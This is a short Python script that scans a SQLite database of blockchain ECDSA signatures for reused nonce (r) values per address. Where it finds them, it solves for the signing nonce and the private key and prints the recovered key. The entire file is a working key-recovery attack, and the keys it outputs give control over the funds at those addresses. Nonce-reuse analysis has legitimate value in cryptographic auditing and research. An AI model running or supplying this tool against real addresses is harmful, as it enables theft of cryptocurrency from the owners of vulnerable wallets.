import sqlite3
from collections import defaultdict

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def find_r_reuse():
    conn = sqlite3.connect('cryscout.db')
    cursor = conn.cursor()
    cursor.execute('SELECT address, r_hex, s_int, z_int, txid FROM signatures')
    all_sigs = cursor.fetchall()
    
    r_map = defaultdict(list)
    for addr, r, s, z, txid in all_sigs:
        if s is None or z is None or r is None: continue
        r_map[(addr, r)].append({'s': int(s), 'z': int(z), 'txid': txid})
        
    found_any = False
    for (addr, r), sigs in r_map.items():
        if len(sigs) > 1:
            # Check if there are at least two different (s, z) pairs
            unique_sigs = set((s['s'], s['z']) for s in sigs)
            if len(unique_sigs) > 1:
                found_any = True
                print(f"\n[!!!] GENUINE R-REUSE FOUND!")
                print(f"Address: {addr}")
                print(f"R-hex:   {r}")
                print(f"Count:   {len(sigs)} signatures")
                
                # Try to recover key
                sig_list = list(unique_sigs)
                s1, z1 = sig_list[0]
                s2, z2 = sig_list[1]
                
                r_int = int(r, 16)
                try:
                    k = ((z1 - z2) * pow(s1 - s2, -1, P)) % P
                    d = ((s1 * k - z1) * pow(r_int, -1, P)) % P
                    print(f"RECOVERED PRIVATE KEY: {hex(d)}")
                except Exception as e:
                    print(f"Recovery failed: {e}")
                    
    if not found_any:
        print("No genuine R-reuse found in database.")
    conn.close()

if __name__ == "__main__":
    find_r_reuse()
